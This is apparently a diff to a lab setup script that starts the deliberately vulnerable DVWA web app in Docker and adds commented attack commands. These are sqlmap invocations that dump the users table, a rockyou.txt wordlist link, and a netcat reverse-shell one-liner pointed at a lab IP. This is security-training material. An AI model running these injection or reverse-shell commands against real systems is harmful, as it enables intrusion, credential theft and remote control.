@@ -35,8 +35,14 @@ tmux send-keys -t "targetSrv" "sudo systemctl start docker" Enter
 tmux send-keys -t "targetSrv" "docker run --rm -it -p 80:80 vulnerables/web-dvwa" Enter
 
 
-#Attack
+#SQL Injection Attack
 
-#sqlmap --url http://10.27.55.25/vulnerabilities/sqli/?id=1\&Submit=Submit# --cookie=' ' -D dvwa -T users --dump
+#sqlmap --url http://<IP>/vulnerabilities/sqli/?id=1\&Submit=Submit# --cookie='security=low; PHPSESSID=<cookie>' --dbs
 
-#curl -c - 'http://10.27.55.25/vulnerabilities/sqli/?id=1\&Submit=Submit#'
+#sqlmap --url http://<IP>/vulnerabilities/sqli/?id=1\&Submit=Submit# --cookie='security=low; PHPSESSID=<cookie>' --dump -D dvwa -T users
+
+#Reverse Shell Attack
+
+#https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+#mkfifo /tmp/lol;nc 10.27.55.20 5555 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
